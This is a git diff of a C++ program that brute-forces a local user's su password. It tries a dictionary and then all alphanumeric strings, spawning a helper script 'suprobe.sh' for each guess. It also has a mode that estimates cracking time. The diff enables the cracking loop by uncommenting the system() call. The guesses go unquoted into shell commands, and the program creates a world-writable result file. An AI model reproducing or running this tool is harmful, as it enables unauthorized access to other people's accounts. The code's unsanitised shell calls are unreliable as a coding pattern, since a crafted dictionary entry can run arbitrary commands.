@@ -16,16 +16,13 @@
 using namespace std;
 
 string USERNAME = "Bob";
-int MAX_VALID_ASCII = 126;
-int PROC_CAP = 600; //How many processes do we think it can handle at once?
-long MEM_DESIRED = 2000000;
-int MIN_VALID_ASCII = 33;
-int MAX_PROC = 700; //will hold the number of processes we can have at once
-
+int PROC_CAP = 500; //How many processes do we think it can handle at once?
 unordered_map <string, int> HT;
 vector <string> pwds;
+unordered_map <char, int> mitoc;
 vector <char> vctoi;
 
+//This function came from Stack Overflow. Thanks, SO!
 string exec(const char* cmd) {
     array<char, 128> buffer;
     string result;
@@ -40,24 +37,12 @@ string exec(const char* cmd) {
 }
 
 long long string_to_int(string s){
-    unsigned long long sum = 0;
-    for(int i = 0; i <= s.length()-1; i++){
-        sum +=(long long) (s[i]-MIN_VALID_ASCII)*(long long)pow(MAX_VALID_ASCII-MIN_VALID_ASCII,s.length()-i-1);
+    long long sum = 0;
+    for(int i = s.length()-1; i>=0; i--){
+	sum += (long long)mitoc[s[i]] * (long long)pow(vctoi.size(), i);	
     }
-    cout << errno << endl;
     return sum;
 }
-
-/*string int_to_string(long long l){
-    string s = "";
-    for(int i = 1; l > 0; i++){
-        char c = vctoi[(l%((long long)(pow(vctoi.size(),i))))];
-        s.push_back(c);
-        l=l/(pow(vctoi.size(),i));
-    }
-    reverse(s.begin(), s.end());
-    return s;
-}*/
 
 string int_to_string(string s, long long n) {
     if (n < vctoi.size()) {
@@ -76,13 +61,7 @@ void passwordFound(int sig){
 	exit(sig);
 }
 
-
-int main(int argc, char **argv){
-    signal(SIGINT, passwordFound);
-    pwds.push_back(""); //Just in case user has no password
-    cout << getpid() << endl;
-
-    //Generate vctoi
+void buildVCTOI(){
     for(int i = 0; i <= 9; i++){
         vctoi.push_back((char)(i+'0')); // adds 0-9
     }
@@ -90,20 +69,23 @@ int main(int argc, char **argv){
         vctoi.push_back((char)(i+'A')); // adds A-Z
         vctoi.push_back((char)(i+'a')); // adds a-z
     }
-
-    //Ideally, print an error message if user fails to run program correctly 
-    cout << "Usage: ./a.out passwords.txt <optional: password>" << endl;
-
-    //Figure out how many procs we can have at once
-    //this gets the total number of processes we can have as the user
-    //do we care about the total number of processes or procs?
-    system("nproc >> process.txt");
-    ifstream process_file;
-    process_file.open("process.txt");
-    //process_file >> MAX_PROC;
-    printf("%d is the max proc\n", MAX_PROC);
+    for(int i = 0; i < vctoi.size(); i++){
+	    mitoc[vctoi[i]] = i;
+    }
+}
 
 
+
+int main(int argc, char **argv){
+    pwds.push_back(""); //Just in case user has no password
+    buildVCTOI(); 
+    cout << getpid() << endl;
+
+    //Print an error message if user fails to run program correctly 
+    if(argc < 2){
+	    cout << "Usage: ./a.out passwords.txt <optional: password>" << endl;
+	    exit(0);
+    }
 
     //Initialize Dictionary 
     ifstream pwd_file;
@@ -115,29 +97,11 @@ int main(int argc, char **argv){
         string pwd;
     int num = 1;
     while (pwd_file >> pwd) {
-        HT[pwd] = num;        //use HT[pwd] to get index
+	HT[pwd] = num;        //use HT[pwd] to get index
         pwds.push_back(pwd);  //use pwds[index] to get pwd
         num++;
     }
     int DICT_SIZE = num;
-
-	//load entire dictionary in an array and seperately in a hash table
-	// HashTable HT;
-	// if (HT.isEmpty()) {
-	// 	cout << "Empty Hash!" << endl;
-	// } else {
-	// 	cout << "Not Empty!" << endl;
-	// }
-	// string pwd;
-	// int num = 0;
-	// while (cin >> pwd) {
-	// 	HT.insertItem(num, pwd);
-	// 	num++;
-    // }
-	
-    // Print Entire Dictionary
-    // HT.printTable();
-
 
     //PASSWORD ANALYSIS MODE:
         //If password is in dictionary, do math to tell user how long it would take 
@@ -145,9 +109,9 @@ int main(int argc, char **argv){
     if(argc==3){
         cout << "Analysis Mode: \n";
         long long time = 0;
-        if(HT[argv[1]] != 0){
-            time = HT[argv[1]] * 3 / MAX_PROC;
-        } else time = (string_to_int(argv[1]) + DICT_SIZE) * 3 / MAX_PROC;
+        if(HT[argv[2]] != 0){
+            time = (HT[argv[2]] * 3) / PROC_CAP;
+        } else time = ((string_to_int(argv[2]) + DICT_SIZE) * 3) / PROC_CAP;
         
         cout << "It would take " << time << " seconds to crack your password.\n";
         return(0);
@@ -156,21 +120,21 @@ int main(int argc, char **argv){
     //PASSWORD CRACKING MODE:
     system("rm su.txt; install -m 666 /dev/null su.txt"); //writeable file for storing password
     for(int i = 0; i <= DICT_SIZE; i++){ //Keeps procs from trying the same words
-        if(i%10==0 && found()) passwordFound(0); //If found, abort
+        if(i%100==0 && found()) passwordFound(0); //If found, abort
 	while(i%3==0 && stoi(exec("ps -e | wc -l")) > PROC_CAP){
             //cout << mem_left() << endl;
             usleep (1000000); //Avoid fork bombing yourself
         }
         const string cmd = "bash suprobe.sh " + pwds[i] +' '+ USERNAME + ' ' + to_string(getpid()) + " >/dev/null 2>/dev/null &";
-        //system(cmd.c_str());
+        system(cmd.c_str());
     }
     //If we make it this far, password was not in dict;
-    for(long long i = 964900; i < 10000000000; i++){ //If we try long enough, give up. To speed up the process to get to "1234", start i at 964900
+    for(long long i = 0; i < 10000000000; i++){ //If we try long enough, give up. To speed up the process to get to "1234", start i at 964900
         //Test Password
         pwd=int_to_string("", i);
         const string cmd = "bash suprobe.sh " + pwd + ' ' + USERNAME + ' ' + to_string(getpid()) + ">/dev/null 2>/dev/null &";
         system(cmd.c_str());
-        if(i%10==0 && found()) passwordFound(0); //If found, abort
+        if(i%100==0 && found()) passwordFound(0); //If found, abort
         //Attempt to keep procs under PROC_CAP
         while(i%3==0 && stoi(exec("ps -e | wc -l")) > PROC_CAP){
             //cout << mem_left() << endl;
